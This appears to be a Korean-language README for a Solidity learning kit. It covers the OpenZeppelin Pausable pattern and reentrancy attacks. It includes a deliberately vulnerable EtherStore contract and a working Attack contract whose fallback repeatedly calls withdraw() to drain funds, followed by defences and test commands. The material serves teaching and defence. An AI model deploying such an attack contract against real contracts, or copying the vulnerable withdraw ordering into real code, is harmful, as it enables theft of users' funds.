https://github.com/choyeah/Pausable-ReenterancyLearningKit

# Pausable

## 개념

"Pausable 컨트랙트"는 컨트랙트의 작동을 일시적으로 중지할 수 있는 기능을 제공한다.
이러한 기능은 주로 유지보수, 긴급 상황 처리, 업그레이드 과정 등에서 필요할 때 컨트랙트의 일부 기능을 일시 정지시키기 위해 사용되는데, 특히 보안 문제가 발생했을 때 빠르게 대응할 수 있는 유연성을 제공하여 시스템의 안정성을 높이는 데 도움을 준다.

## Pausable 컨트랙트 주요 요소

### storage 변수

```
bool private _paused;
```

> 중지 상태, 생성자에서 기본값으로 false를 대입한다.

### event

```
event Paused(address account);
event Unpaused(address account);
```

> 각각 중지, 중지 해제 시에 발생된다.

### modifier

```
modifier whenNotPaused() {
    _requireNotPaused();
    _;
}

function _requireNotPaused() internal view virtual {
    require(!paused(), "Pausable: paused");
}

modifier whenPaused() {
    _requirePaused();
    _;
}

function _requirePaused() internal view virtual {
    require(paused(), "Pausable: not paused");
}
```

## functions

```
function paused() public view virtual returns (bool) {
    return _paused;
}

function _pause() internal virtual whenNotPaused {
    _paused = true;
    emit Paused(_msgSender());
}

function _unpause() internal virtual whenPaused {
    _paused = false;
    emit Unpaused(_msgSender());
}
```

\_pause(), \_unpause()는 상속받는 컨트랙트에서 구현해줘야 하고 적절한 권한을 가진 계정만 호출할 수 있도록 해야한다.

```
// SPDX-License-Identifier: MIT
import "@openzeppelin/contracts/security/Pausable.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract VendingMachine is Pausable, Ownable {
    // 기타 컨트랙트 구현

    // 소유자만 컨트랙트를 일시 정지할 수 있습니다.
    function pause() public onlyOwner {
        _pause();
    }

    // 소유자만 컨트랙트의 일시 정지를 해제할 수 있습니다.
    function unpause() public onlyOwner {
        _unpause();
    }

    // 기타 컨트랙트 함수 구현
}
```

## 테스트

```
npx hardhat test ./test/vendingMachineTest.ts
```

# Reentrancy Attack

## 개념

Reentrancy 공격은 스마트 컨트랙트가 외부 컨트랙트에 자금을 전송하는 과정에서 발생할 수 있는 보안 취약점을 악용하는 공격 방식이다. 이 공격은 스마트 컨트랙트가 자금을 전송하고 그 결과를 내부 상태에 반영하기 전에, 전송된 자금을 받는 컨트랙트가 원본 컨트랙트의 함수를 재호출할 수 있게 함으로써 발생된다. 이 재호출은 원본 컨트랙트가 자금 전송 후 내부 상태를 업데이트하기 전에 이루어지므로, 악의적인 수신자 컨트랙트는 이 취약점을 이용해 원본 컨트랙트로부터 반복적으로 자금을 인출할 수 있다.

## Reentrancy Attack 시나리오

```
contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

1. Attack 컨트랙트에서 EtherStore 컨트랙트에 코인을 deposit 한다.
2. Attack 컨트랙트 계정으로 EtherStore.withdraw()를 호출한다.
3. msg.sender.call{value: bal}(""); 로직이 실행되고 이 호출은 Attack 컨트랙트의 fallback()을 호출하게된다.
4. Attack.fallback() etherStore.withdraw();를 다시 호출한다.
5. etherStore.balance >= 1 ether 조건이 참인동안 3, 4번 과정이 반복된다.
6. etherStore.balance가 모두 탈취된 후 balances[msg.sender] = 0; 처리가 된다.

## Reentrancy 공격 방지 대책

### 1. Checks-Effects-Interactions' 패턴의 적용

단순히 전송 여부를 업데이트하는 로직의 순서를 전송처리 전에 둠으로써 간단히 해결 가능하다.

변경전

```
function withdraw() public {
    uint bal = balances[msg.sender];
    require(bal > 0);

    (bool sent, ) = msg.sender.call{value: bal}("");
    require(sent, "Failed to send Ether");

    balances[msg.sender] = 0;
}
```

변경후

```
function withdraw() public {
    uint bal = balances[msg.sender];
    require(bal > 0);

    balances[msg.sender] = 0; <-- 바뀐 부분
    (bool sent, ) = msg.sender.call{value: bal}("");
    require(sent, "Failed to send Ether");
}
```

### 2. ReentrancyGuard 미들웨어 적용

오픈제플린 ReentrancyGuard 컨트랙트를 상속받아 방어할 함수에 모디파이어를 적용한다.

```
pragma solidity 0.8.13;
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract EtherStoreGuard is ReentrancyGuard{
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public nonReentrant { <-- 방어할 함수에 모디파이어 적용
        uint bal = balances[msg.sender];
        require(bal > 0);
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }
.
.
.

```

> 함수의 진입, 종료 각각의 시점에서 상태변수를 업데이트하여 락을 거는 원리이다.

## 테스트

Reentrancy 공격 테스트

```
npx hardhat test ./test/reEntrancyTest.ts
```

Reentrancy 방어 테스트

```
npx hardhat test ./test/reEntrancyTest2.ts
```
